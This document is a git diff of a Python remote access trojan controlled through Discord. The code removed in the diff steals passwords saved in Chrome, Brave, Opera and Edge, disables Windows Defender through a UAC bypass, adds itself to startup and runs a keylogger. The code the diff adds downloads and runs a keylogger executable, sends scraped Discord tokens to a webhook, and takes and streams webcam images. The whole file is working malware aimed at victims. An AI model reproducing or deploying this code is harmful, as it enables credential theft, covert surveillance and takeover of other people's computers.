@@ -1,3 +1,4 @@
+from lzma import FILTER_LZMA1
 import discord
 import json 
 import subprocess 
@@ -46,7 +47,7 @@ from discord_slash.model import ButtonStyle
 from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component
 
 from tokens import g, token
-# from auto import *
+from auto import *
 
 
 ## Auto Commands
@@ -122,394 +123,8 @@ async def on_ready():
         await channel.send(f'{value1} with **`admin`** perms sheeeeeeeeesh')
     elif is_admin == False:
         await channel.send(value1)
-    game = discord.Game(f"Window logging stopped")
+    game = discord.Game(f"RAT | dev cookiesservices.xyz")
     await client.change_presence(status=discord.Status.online, activity=game)
-
-    ## Start Auto Commands
-    if (Auto_Commands):
-        await channel.send("```Starting Auto Commands```")
-
-        if (Auto_Startup):
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:  
-                path = sys.argv[0]
-                isexe=False
-                if (sys.argv[0].endswith("exe")):
-                    isexe=True
-                if isexe:
-                    os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
-                else:
-                    os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
-                    e = r"""
-    Set objShell = WScript.CreateObject("WScript.Shell")
-    objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
-    """.format(os.path.basename(sys.argv[0]))
-                    with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
-                        f.write(e)
-                        f.close()
-                await channel.send("Successfuly added to startup")  
-            else:
-                await channel.send("This command requires admin privileges")
-
-        if (Auto_GrabPasswords):
-            await channel.send("Grabbing Passwords. . .")
-            
-
-
-            def decrypt_payload(cipher, payload):
-                return cipher.decrypt(payload)
-            def generate_cipher(aes_key, iv):
-                return AES.new(aes_key, AES.MODE_GCM, iv)
-            def decrypt_password(buff, master_key):
-                try:
-                    iv = buff[3:15]
-                    payload = buff[15:]
-                    cipher = generate_cipher(master_key, iv)
-                    decrypted_pass = decrypt_payload(cipher, payload)
-                    decrypted_pass = decrypted_pass[:-16].decode()
-                    return decrypted_pass
-                except Exception as e:
-                    print(str(e))
-
-
-            username = getpass.getuser()
-            #######################################################################
-            #######################################################################
-            #######################################################################
-            try:
-                def get_master_key():
-                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', "r", encoding='utf-8') as f:
-                        local_state = f.read()
-                        local_state = json.loads(local_state)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]  # removing DPAPI
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-                if __name__ == '__main__':
-                    master_key = get_master_key()
-                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
-                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                    conn = sqlite3.connect("Loginvault.db")
-                    cursor = conn.cursor()
-                    try:
-                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                        for r in cursor.fetchall():
-                            url = r[0]
-                            username = r[1]
-                            encrypted_password = r[2]
-                            decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("GooglePasswords.txt","a") as f:
-                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                                f.close()
-                    except Exception as e:
-                        pass
-                    cursor.close()
-                    conn.close()
-                    try:
-                        os.remove("Loginvault.db")
-                    except Exception as e:
-                        pass
-            except FileNotFoundError:
-                pass
-            #######################################################################
-            #######################################################################
-            #######################################################################
-            try:
-                def get_master_key():
-                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State', "r", encoding='utf-8') as f:
-                        local_state = f.read()
-                        local_state = json.loads(local_state)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]  # removing DPAPI
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-                if __name__ == '__main__':
-                    master_key = get_master_key()
-                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data'
-                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                    conn = sqlite3.connect("Loginvault.db")
-                    cursor = conn.cursor()
-                    try:
-                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                        for r in cursor.fetchall():
-                            url = r[0]
-                            username = r[1]
-                            encrypted_password = r[2]
-                            decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("BravePasswords.txt","a") as f:
-                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                                f.close()  
-                    except Exception as e:
-                        pass
-                    cursor.close()
-                    conn.close()
-                    try:
-                        os.remove("Loginvault.db")
-                    except Exception as e:
-                        pass
-            except FileNotFoundError:
-                pass
-            #######################################################################
-            #######################################################################
-            #######################################################################
-            try:
-                def get_master_key():
-                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State', "r", encoding='utf-8') as f:
-                        local_state = f.read()
-                        local_state = json.loads(local_state)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]  # removing DPAPI
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-                if __name__ == '__main__':
-                    master_key = get_master_key()
-                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
-                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                    conn = sqlite3.connect("Loginvault.db")
-                    cursor = conn.cursor()
-                    try:
-                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                        for r in cursor.fetchall():
-                            url = r[0]
-                            username = r[1]
-                            encrypted_password = r[2]
-                            decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("OperaPasswords.txt","a") as f:
-                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                                f.close()
-                    except Exception as e:
-                        pass
-                    cursor.close()
-                    conn.close()
-                    try:
-                        os.remove("Loginvault.db")
-                    except Exception as e:
-                        pass
-            except FileNotFoundError:
-                pass
-            #######################################################################
-            #######################################################################
-            #######################################################################
-            try:
-                def get_master_key():
-                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
-                        local_state = f.read()
-                        local_state = json.loads(local_state)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]  # removing DPAPI
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-                if __name__ == '__main__':
-                    master_key = get_master_key()
-                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
-                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-                    conn = sqlite3.connect("Loginvault.db")
-                    cursor = conn.cursor()
-                    try:
-                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                        for r in cursor.fetchall():
-                            url = r[0]
-                            username = r[1]
-                            encrypted_password = r[2]
-                            decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("EdgePasswords.txt","a") as f:
-                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
-                                f.close()             
-                    except Exception as e:
-                        pass
-                    cursor.close()
-                    conn.close()
-                    try:
-                        os.remove("Loginvault.db")
-                    except Exception as e:
-                        pass
-            except FileNotFoundError:
-                pass
-
-
-            ## Send Found Data
-            try:
-                file1 = discord.File("GooglePasswords.txt", filename="GooglePasswords.txt")
-                await channel.send("Found GooglePasswords", file=file1)
-            except FileNotFoundError:
-                await channel.send("User has not got CHROME downloaded!")
-
-            try:
-                file2 = discord.File("BravePasswords.txt", filename="BravePasswords.txt")
-                await channel.send("Found BravePasswords", file=file2)
-            except FileNotFoundError:
-                await channel.send("User has not got BRAVE downloaded!")
-
-            try:
-                file3 = discord.File("OperaPasswords.txt", filename="OperaPasswords.txt")
-                await channel.send("Found OperaPasswords", file=file3)
-            except FileNotFoundError:
-                await channel.send("User has not got OPERA downloaded!")
-
-            try:
-                file4 = discord.File("EdgePasswords.txt", filename="EdgePasswords.txt")
-                await channel.send("Found EdgePasswords", file=file4)
-            except FileNotFoundError:
-                await channel.send("User has not got EDGE downloaded!")
-
-
-            os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")        
-
-        if (Auto_DisableAV):
-            class disable_fsr():
-                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
-                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
-                def __enter__(self):
-                    self.old_value = ctypes.c_long()
-                    self.success = self.disable(ctypes.byref(self.old_value))
-                def __exit__(self, type, value, traceback):
-                    if self.success:
-                        self.revert(self.old_value)
-            await channel.send("**Attempting to get admin!**")
-
-            ###### CREATE BATCH FILE ######
-            temp = (os.getenv("temp"))
-            bat = """
-    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
-    cls
-    rem 0 - Disable Logging
-    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
-    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
-    cls
-    rem Disable WD Tasks
-    schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
-    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
-    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
-    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
-    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
-    cls 
-    rem Disable WD systray icon
-    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
-    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
-    cls
-    rem Remove WD context menu
-    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
-    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
-    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
-    cls
-    rem Disable WD services
-    reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
-    reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
-    reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
-    reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
-    reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
-    cls
-            """
-            temp2 = temp + r"\\av.bat"
-            if os.path.isfile(temp2):
-                os.remove(temp2)
-            f6 = open(temp + r"\\av.bat", 'w')
-            f6.write(bat)
-            f6.close()
-
-            ###### FORCE RUN BATCH FILE AS ADMIN ######
-            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
-            os.system(create_reg_path)
-            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
-            os.system(create_trigger_reg_key) 
-            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
-            os.system(create_payload_reg_key)
-            with disable_fsr():
-                os.system("fodhelper.exe")
-            time.sleep(2)
-            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
-            os.system(remove_reg)
-
-        if (Auto_CritProcess):
-            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
-            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-
-        if (Auto_DisableTaskmanager):
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                global statuuusss
-                statuuusss = None
-                instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
-                def shell():
-                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    global status
-                    statuuusss = "ok"
-                    return output
-                shel = threading.Thread(target=shell)
-                shel._running = True
-                shel.start()
-                time.sleep(1)
-                shel._running = False
-                result = str(shell().stdout.decode('CP437'))
-                if len(result) <= 5:
-                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
-                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
-                else:
-                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
-                await channel.send("Successfuly disabled victims task manager")
-            else:
-                await channel.send("**This command requires admin privileges**")
-
-        if (Auto_DisplayOff):
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                WM_SYSCOMMAND = 274
-                HWND_BROADCAST = 65535
-                SC_MONITORPOWER = 61808
-                ctypes.windll.user32.BlockInput(True)
-                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-                await channel.send("Command executed!")
-            else:
-                await channel.send("Admin rights are required")
-
-        if (Auto_Info):
-            jak = str(platform.uname())
-            intro = jak[12:]
-            ip = get('https://api.ipify.org').text
-            pp = "IP Address = " + ip
-            await channel.send("Command executed : " + intro + pp)
-
-        if (Auto_GeoLocate):
-            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
-                data = json.loads(url.read().decode())
-                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-                await channel.send("Command executed : " + link)
-
-        if (Auto_StartKeylogger):
-            temp = os.getenv("TEMP")
-            log_dir = temp
-            logging.basicConfig(filename=(log_dir + r"\\key_log.txt"),
-                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
-            def keylog():
-                def on_press(key):
-                    logging.info(str(key))
-                with Listener(on_press=on_press) as listener:
-                    listener.join()
-            global test
-            test = threading.Thread(target=keylog)
-            test._running = True
-            test.daemon = True
-            test.start()
-            await channel.send("Keylogger started")
-
-        if (Auto_WindowLoggerStart):
-            global stop_threads
-            stop_threads = False
-
-            threading.Thread(target=between_callback, args=(client,)).start()
-            await channel.send("Window logging for this session started")
 
 on_ready.total = []
 
@@ -545,6 +160,7 @@ def uncritproc():
 
 @slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
 async def kill_command(ctx: SlashContext):
+    await ctx.send("Killing all inactive sessions, please wait. . .")
     for y in range(len(on_ready.total)): 
         if "session" in on_ready.total[y]:
             channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
@@ -598,43 +214,52 @@ async def info_command(ctx: SlashContext):
         with urllib.request.urlopen("https://geolocation-db.com/json") as url:
             data = json.loads(url.read().decode())
             link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-            await ctx.send("Command executed : " + link)
+            await ctx.send("Command executed : " + link)    
 
 
-@slash.slash(name="KeyLogDump", description="dumb the keylogs", guild_ids=g)
-async def KeyLogDump_command(ctx: SlashContext):
+@slash.slash(name="keyloggerstop", description="stop keylogger", guild_ids=g)
+async def keyloggerstop_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        temp = os.getenv("TEMP")
-        file_keys = temp + r"\\key_log.txt"
-        file = discord.File(file_keys, filename="key_log.txt")
-        await ctx.send("Command executed!", file=file)
-        os.remove(file_keys)
-        
+        import psutil
+        temp = (os.getenv("temp"))
+        if os.path.exists(f'{temp}\\$~cache\\sd.exe'):
+            try:
+                for proc in psutil.process_iter():
+                    if proc.name() == "sd.exe":
+                        proc.kill()
+                os.remove(f'{temp}\$~cache\sd.exe')
+            except Exception as e:
+                await ctx.send(f"Error occured while stopping keylogger\n\n{e}")
+            await ctx.send("Keylogger stopped and uninstalled successfully")
+        else:
+            await ctx.send("Error no running keylogger found!")
 
-@slash.slash(name="startkeylogger", description="start a key logger on their pc", guild_ids=g)
-async def startKeyLogger_command(ctx: SlashContext):
+
+@slash.slash(name="KeyLogger", description="start a key logger on their pc (with created add on exe)", guild_ids=g)
+async def KeyLogger_command(ctx: SlashContext, keylogger_downlod_link: str):
     if ctx.channel.name == channel_name:
-            import base64
-            import os
-            from pynput.keyboard import Key, Listener
-            import logging
-            temp = os.getenv("TEMP")
-            log_dir = temp
-            logging.basicConfig(filename=(log_dir + r"\\key_log.txt"),
-                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
-            def keylog():
-                def on_press(key):
-                    logging.info(str(key))
-                with Listener(on_press=on_press) as listener:
-                    listener.join()
-            import threading
-            global test
-            test = threading.Thread(target=keylog)
-            test._running = True
-            test.daemon = True
-            test.start()
-            await ctx.send("Keylogger started")
+        await ctx.send("Downloading Key Logger, please wait. . .")
+        temp = (os.getenv("temp"))
+
+        try:
+            #? Create cache folder
+            if os.path.exists(f'{temp}\\$~cache'):
+                pass
+            else:
+                os.mkdir(f'{temp}\$~cache')
+
+            #? Download Keylogger
+            url = keylogger_downlod_link
+            r = requests.get(f"{url}")
+            with open(f'{temp}\\$~cache\\sd.exe', 'wb') as f:
+                f.write(r.content)
+            f.close()
+
+            #? Run KeyLogger
+            os.startfile(f'{temp}\\$~cache\\sd.exe')
+            await ctx.send(f"Key Logger started successfully!")
+        except Exception as e:
+            await ctx.send(f"Error occured! \n```{e}```")
 
 
 @slash.slash(name="forceAdmin", description="attempt to force admin, Works but very buggy", guild_ids=g)
@@ -695,110 +320,72 @@ async def forceAdmin_command(ctx: SlashContext):
             os.system(remove_reg)
 
 
-@slash.slash(name="stopkeylogger", description="stop the key logger", guild_ids=g)
-async def stopKeyLogger_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        import os
-        test._running = False
-        await ctx.send("Keylogger stopped")
-
-
 @slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
-async def tokens_command(ctx: SlashContext):
+async def tokens_command(ctx: SlashContext, webhook_url: str):
     if ctx.channel.name == channel_name:
-        await ctx.send("Extracting tokens please wait. . .")
-        import os
-        from re import findall
-        from json import loads
-        from base64 import b64decode
+        await ctx.send("Extracting tokens, please wait. . .")
+        import os, re, json
         from urllib.request import Request, urlopen
-        LOCAL = os.getenv("LOCALAPPDATA")
-        ROAMING = os.getenv("APPDATA")
-        tokens_path = ROAMING + "\\.caches~$.txt"
-        f = open(tokens_path, 'r+')
-        f.truncate(0)
-        PATHS = {
-            "Discord"           : ROAMING + "\\Discord",
-            "Discord Canary"    : ROAMING + "\\discordcanary",
-            "Discord PTB"       : ROAMING + "\\discordptb",
-            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
-        }
-        def getheaders(token=None, content_type="application/json"):
-            headers = {
-                "Content-Type": content_type,
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-            }
-            if token:
-                headers.update({"Authorization": token})
-            return headers
-        def getuserdata(token):
-            try:
-                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-            except:
-                pass
-        def gettokens(path):
-            path += "\\Local Storage\\leveldb"
+
+        async def find_tokens(path):
+            path += '\\Local Storage\\leveldb'
+
             tokens = []
+
             for file_name in os.listdir(path):
-                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue
-                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                        for token in findall(regex, line):
+
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
                             tokens.append(token)
             return tokens
-        def main():
-            tokens_path = ROAMING + "\\.caches~$.txt"
-            cache_path = ROAMING + "\\.cache~$"
-            working = []
-            checked = []
-            already_cached_tokens = []
-            working_ids = []
-            for platform, path in PATHS.items():
-                if not os.path.exists(path):
-                    continue         
-                for token in gettokens(path):
-                    if token in checked:
-                        continue
-                    checked.append(token)
-                    uid = None
-                    if not token.startswith("mfa."):
-                        try:
-                            uid = b64decode(token.split(".")[0].encode()).decode()
-                        except:
-                            pass
-                        if not uid or uid in working_ids:
-                            continue
-                    user_data = getuserdata(token)
-                    if not user_data:
-                        continue
-                    working_ids.append(uid)
-                    working.append(token)
-                    f = open(tokens_path, 'a+')
-                    f.write(f'{token}\n\n')
-                    f.close()
-                    
-            with open(cache_path, "a") as file:
-                for token in checked:
-                    if not token in already_cached_tokens:
-                        file.write(token + "\n")
-            if len(working) == 0:
-                working.append('123')
+
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
+
+        message = ''
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            message += f'\n**{platform}**\n```\n'
+
+            tokens = await find_tokens(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f'{token}\n'
+            else:
+                message += 'No tokens found.\n'
+
+            message += '```'
+
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        }
+
+        payload = json.dumps({'content': message})
 
         try:
-            main()
-            tokens_path = ROAMING + "\\.caches~$.txt"
-            file1 = open(tokens_path, 'r')
-            data = file1.read()
-            embed = discord.Embed(title="Found Tokens", description=f"```{data}```")
-            await ctx.send(embed=embed)
-
-        except Exception as e:
-            await ctx.send(f"**Error occured** ```{e}```")
+            req = Request(webhook_url, data=payload.encode(), headers=headers)
+            urlopen(req)
+        except:
             pass
+
 
 
 @slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
@@ -839,28 +426,22 @@ def get_dims(cap, res='1080p'):
     change_res(cap, width, height)
     return width, height
 
-@slash.slash(name="webcam", description="takes a video of their webcam", guild_ids=g)
+@slash.slash(name="webcam", description="takes a picture of their webcam", guild_ids=g)
 async def webcam_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        await ctx.send("Taking video of webcam. . .")
-        temp = os.path.join(f"{os.getenv('TEMP')}\\video.mp4")
-        res = '720p'
-        t_end = time.time() + 2
-
-        cap = cv2.VideoCapture(0)
-        if cap.isOpened():
-            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, get_dims(cap, res))
-            while time.time() < t_end:
-                ret, frame = cap.read()
-                out.write(frame)
-            cap.release()
-            out.release()
-            cv2.destroyAllWindows()
-        else:
-            await ctx.send(f"**{os.getlogin()}'s** has no webcam :/")
-        file = discord.File(temp, filename="video.mp4")
-        await ctx.send("Webcam Video taken!", file=file)
-        os.remove(temp)
+        await ctx.send("Taking picture of webcam. . .")
+        import cv2, os
+        try:
+            temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
+            camera = cv2.VideoCapture(0)
+            return_value,image = camera.read()
+            cv2.imwrite(temp,image)
+            camera.release()
+            file = discord.File(temp, filename="webcam.jpg")
+            await ctx.send("Picture taken!", file=file)
+            os.remove(temp)
+        except Exception as e:
+            await ctx.send(f"Error occured!\n\n```{e}```")
 
 
 @slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
@@ -907,41 +488,48 @@ async def Download_command(ctx: SlashContext, downloadfile: str):
         await  ctx.send(f"Successfully downloaded file {downloadfile}", file=file) 
 
 
-# @slash.slash(name="StreamWebCam", description="Streams webcam by sening multiple pictures", guild_ids=g)
-# async def StreamWebCam_command(ctx: SlashContext):
-#     if ctx.channel.name == channel_name:
-#         await ctx.send("Command executed!")
-#         import os
-#         import cv2
-#         temp = (os.getenv('TEMP'))
-#         camera_port = 0
-#         camera = cv2.VideoCapture(camera_port)
-#         file = temp + r"\\hobo\\hello.txt"
-#         if os.path.isfile(file):
-#             delelelee = "del " + file + r" /f"
-#             os.system(delelelee)
-#             os.system(r"RMDIR %temp%\\hobo /s /q")
-#         while True:
-#             image = camera.read()
-#             cv2.imwrite(temp + r"\\temp.png", image)
-#             temp = (os.getenv('TEMP'))
-#             file = temp + r"\\hobo\\hello.txt"
-#             if os.path.isfile(file):
-#                 del camera
-#                 break
-#             else:
-#                 continue  
+@slash.slash(name="StreamWebCam", description="Stream webcam, time format (hh:mm:ss)", guild_ids=g)
+async def StreamWebCam_command(ctx: SlashContext, stream_time: str):
+    if ctx.channel.name == channel_name:
+        import time, os, cv2
+
+        def convert_seconds(time_str):
+            hh, mm, ss = time_str.split(':')
+            return int(hh) * 3600 + int(mm) * 60 + int(ss)
+
+        time_length = stream_time 
+        seconds_length = convert_seconds(time_length) 
+        global end
+        end = time.time() + seconds_length
+
+        async def StreamWebcam(end):
+            temp = (os.getenv('TEMP'))
+            hellos = temp + r"\\hobos\\hellos.txt"        
+            if os.path.isfile(hellos):
+                os.system(r"del %temp%\\hobos\\hellos.txt /f")
+                os.system(r"RMDIR %temp%\\hobos /s /q")     
+            else:
+                pass
+            while time.time() < end:
+                temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
+                camera = cv2.VideoCapture(0)
+                return_value,image = camera.read()
+                cv2.imwrite(temp,image)
+                camera.release()
+                file = discord.File(temp, filename="webcam.jpg")
+                await ctx.send(file=file)
+                hellos = temp + r"\\hobos\\hellos.txt"
+                if os.path.isfile(hellos):
+                    break
+                else:
